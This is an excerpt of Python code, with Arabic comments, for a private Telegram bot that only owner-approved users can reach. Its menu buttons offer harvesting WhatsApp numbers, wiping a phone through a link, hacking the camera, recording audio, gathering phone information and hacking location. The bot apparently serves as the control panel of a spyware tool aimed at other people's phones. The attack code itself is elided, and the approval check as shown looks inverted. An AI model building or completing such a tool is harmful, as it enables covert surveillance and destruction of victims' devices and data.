...
ADMIN_ID = 6709215417  # الأيدي الخاص بك

bot = telebot.TeleBot(TOKEN)
WHITE_LIST_FILE = "users_list.txt"
user_states = {}

# دالة تحميل المستخدمين المقبولين
def load_users():
    if not os.path.exists(WHITE_LIST_FILE): return [ADMIN_ID]
    with open(WHITE_LIST_FILE, "r") as f:
        return [int(line.strip()) for line in f if line.strip().isdigit()]

# دالة حفظ مستخدم جديد
def save_user(user_id):
    if user_id not in load_users():
        with open(WHITE_LIST_FILE, "a") as f: f.write(f"{user_id}\n")
...
def main_markup():
    ...
    markup.add(types.KeyboardButton("سحب ارقام وتساب"), types.KeyboardButton("فرمتة الهاتف عبر رابط"))
    markup.add(types.KeyboardButton("📸 اختراق الكاميرا"), types.KeyboardButton("🎧تسجيل صوت"))
    markup.add(types.KeyboardButton("📱معلومات الهاتف"), types.KeyboardButton("🌐 اختراق الموقع"))
...
def start(message):
    ...
    if user_id in load_users():
        ...
        bot.send_message(message.chat.id, "⚠️ هذا البوت خاص، تم إرسال طلبك للمالك للموافقة. انتظر الرد...")
        admin_markup = types.InlineKeyboardMarkup()
        admin_markup.add(types.InlineKeyboardButton("✅ قبول", callback_data=f"accept_{user_id}"), types.InlineKeyboardButton("❌ رفض", callback_data=f"reject_{user_id}"))
        bot.send_message(ADMIN_ID, f"🔔 طلب انضمام جديد:\nالأيدي: {user_id}", reply_markup=admin_markup)
